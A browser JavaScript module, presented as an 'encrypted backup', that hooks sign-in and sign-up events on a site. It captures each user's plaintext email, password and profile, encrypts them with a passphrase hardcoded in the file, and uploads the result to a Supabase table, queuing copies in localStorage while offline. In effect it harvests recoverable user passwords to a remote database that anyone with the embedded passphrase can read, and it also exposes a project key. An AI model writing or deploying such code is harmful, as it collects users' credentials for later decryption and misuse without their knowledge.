// ED-general-encrypted-backup.js
// Captures credentials + profile on sign‑in / sign‑up
// Encrypts the whole snapshot and inserts a NEW row into Supabase.
// Offline support: stores pending backups in localStorage, syncs when online.
// NO decryption code whatsoever.

(function () {
  'use strict';

  const SUPABASE_URL = 'https://hmjbzzuresgzwzefjpyt.supabase.co';
  const SUPABASE_ANON_KEY =
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhtamJ6enVyZXNnend6ZWZqcHl0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODAwMjczNDUsImV4cCI6MjA5NTYwMzM0NX0.44Q-Hkl4Rr9LuQhwryrQklFi809xYGteHgsS9nMG0ro';

  const ENCRYPTION_PASSPHRASE = 'nadhem000@@@';
  const PBKDF2_ITERATIONS = 200000;
  const SALT_LENGTH = 16;
  const LOCAL_PENDING_KEY = (userId) => `encBackup_pending_${userId}`;

  let supabase = null;

  // ──────────────────────────────────────────────
  //  Load Supabase client
  // ──────────────────────────────────────────────
  function loadSupabaseClient() {
    return new Promise((resolve, reject) => {
      if (window.supabase) return resolve(window.supabase);
      const script = document.createElement('script');
      script.src = 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2';
      script.onload = () => resolve(window.supabase);
      script.onerror = () => reject(new Error('Failed to load Supabase client'));
      document.head.appendChild(script);
    });
  }

  // ──────────────────────────────────────────────
  //  Crypto – encryption only
  // ──────────────────────────────────────────────
  async function deriveKey(passphrase, saltBytes) {
    const enc = new TextEncoder();
    const keyMaterial = await crypto.subtle.importKey(
      'raw', enc.encode(passphrase), 'PBKDF2', false, ['deriveKey']
    );
    return crypto.subtle.deriveKey(
      { name: 'PBKDF2', salt: saltBytes, iterations: PBKDF2_ITERATIONS, hash: 'SHA-256' },
      keyMaterial,
      { name: 'AES-GCM', length: 256 },
      false,
      ['encrypt']   // only encrypt
    );
  }

  async function encrypt(dataObj) {
    const salt = crypto.getRandomValues(new Uint8Array(SALT_LENGTH));
    const key = await deriveKey(ENCRYPTION_PASSPHRASE, salt);
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const ciphertext = await crypto.subtle.encrypt(
      { name: 'AES-GCM', iv },
      key,
      new TextEncoder().encode(JSON.stringify(dataObj))
    );
    // Concatenate salt + iv + ciphertext
    const combined = new Uint8Array(salt.length + iv.length + ciphertext.byteLength);
    combined.set(salt, 0);
    combined.set(iv, salt.length);
    combined.set(new Uint8Array(ciphertext), salt.length + iv.length);
    return btoa(String.fromCharCode(...combined));
  }

  // ──────────────────────────────────────────────
  //  Pending backup queue (localStorage)
  // ──────────────────────────────────────────────
  function getPending(userId) {
    const raw = localStorage.getItem(LOCAL_PENDING_KEY(userId));
    if (!raw) return [];
    try { return JSON.parse(raw); } catch { return []; }
  }

  function addPending(userId, encryptedBlob) {
    const pending = getPending(userId);
    pending.push({ encrypted_data: encryptedBlob, timestamp: Date.now() });
    localStorage.setItem(LOCAL_PENDING_KEY(userId), JSON.stringify(pending));
  }

  function clearPending(userId) {
    localStorage.removeItem(LOCAL_PENDING_KEY(userId));
  }

  // ──────────────────────────────────────────────
  //  Send a single encrypted row to Supabase
  // ──────────────────────────────────────────────
  async function sendToSupabase(userId, encryptedBlob) {
    if (!supabase) throw new Error('Supabase not ready');
    const { error } = await supabase
      .from('encrypted_user_data')
      .insert({ user_id: userId, encrypted_data: encryptedBlob });
    if (error) throw error;
  }

  // ──────────────────────────────────────────────
  //  Flush all pending rows for a user
  // ──────────────────────────────────────────────
  async function flushPending(userId) {
    const pending = getPending(userId);
    if (pending.length === 0) return;

    let sent = 0;
    for (const entry of pending) {
      try {
        await sendToSupabase(userId, entry.encrypted_data);
        sent++;
      } catch (e) {
        console.warn('Failed to sync one backup entry', e);
        break;   // keep the rest for the next online event
      }
    }

    // Remove successfully sent entries
    if (sent > 0) {
      const remaining = pending.slice(sent);
      if (remaining.length > 0) {
        localStorage.setItem(LOCAL_PENDING_KEY(userId), JSON.stringify(remaining));
      } else {
        clearPending(userId);
      }
    }
  }

  // ──────────────────────────────────────────────
  //  Event handler: capture credentials + profile
  // ──────────────────────────────────────────────
  async function handleCapture(event) {
    const { email, password, profile } = event.detail;
    if (!email || !password) return;

    let userId;
    try {
      if (supabase) {
        const { data } = await supabase.auth.getSession();
        userId = data?.session?.user?.id;
      }
    } catch (e) {
      console.error('Cannot get session for backup', e);
    }
    if (!userId) return;

    const dataObj = {
      email,
      password,
      profile: profile || null,
      timestamp: Date.now()
    };

    const encryptedBlob = await encrypt(dataObj);
    addPending(userId, encryptedBlob);

    // Immediately try to sync if online
    if (navigator.onLine) {
      await flushPending(userId);
    }
  }

  // ──────────────────────────────────────────────
  //  Online event: sync any leftover backups
  // ──────────────────────────────────────────────
  async function onOnline() {
    if (!supabase) return;
    const { data } = await supabase.auth.getSession();
    const userId = data?.session?.user?.id;
    if (userId) await flushPending(userId);
  }

  // ──────────────────────────────────────────────
  //  Initialisation
  // ──────────────────────────────────────────────
  async function init() {
    try {
      const Supabase = await loadSupabaseClient();
      supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

      document.addEventListener('ed-enc-backup-capture', handleCapture);
      window.addEventListener('online', onOnline);

      // Flush any pending backup on startup (if already signed in)
      const { data } = await supabase.auth.getSession();
      if (data?.session?.user?.id) {
        await flushPending(data.session.user.id);
      }
    } catch (err) {
      console.error('Encrypted backup init failed:', err);
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();